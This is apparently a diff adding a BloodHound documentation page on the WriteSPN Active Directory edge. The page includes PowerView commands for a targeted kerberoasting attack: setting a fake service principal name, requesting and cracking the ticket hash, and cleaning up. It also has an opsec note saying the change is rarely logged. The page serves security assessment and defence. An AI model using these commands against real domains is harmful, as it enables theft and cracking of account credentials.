@@ -1,0 +1,48 @@
+---
+title: WriteSPN
+description: The ability to write directly to the servicePrincipalNames attribute on a user object. 
+---
+
+<img noZoom src="/assets/enterprise-AND-community-edition-pill-tag.svg" alt="Applies to BloodHound Enterprise and CE"/>
+
+
+Writing to this property gives you the opportunity to perform a targeted kerberoasting attack against that user.
+
+## Abuse Info
+
+A targeted kerberoast attack can be performed using PowerView’s Set-DomainObject along with Get-DomainSPNTicket.
+
+You may need to authenticate to the Domain Controller as the user with full control over the target user if you are not running a process as that user. To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):
+
+```
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\\dfm.a', $SecPassword)
+```
+
+Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as the user with full control over the target user.
+```
+Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
+```
+After running this, you can use Get-DomainSPNTicket as follows:
+```
+Get-DomainSPNTicket -Credential $Cred harmj0y | fl
+```
+The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:
+```
+Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname
+```
+## Opsec Considerations
+
+Modifying the servicePrincipalName attribute will not, by default, generate an event on the Domain Controller. Your target may have configured logging on users to generate 5136 events whenever a directory service is modified, but this configuration is very rare.
+
+## Edge Schema
+
+Source: [User](/resources/nodes/user), [Group](/resources/nodes/group), [Computer](/resources/nodes/computer)   
+Destination: [User](/resources/nodes/user)  
+Traversable: **Yes**  
+
+## References
+
+* [https://blog.harmj0y.net/redteaming/kerberoasting-revisited/](https://blog.harmj0y.net/redteaming/kerberoasting-revisited/)
+* [https://specterops.io/blog/2022/02/09/introducing-bloodhound-4-1-the-three-headed-hound/](https://specterops.io/blog/2022/02/09/introducing-bloodhound-4-1-the-three-headed-hound/)
+
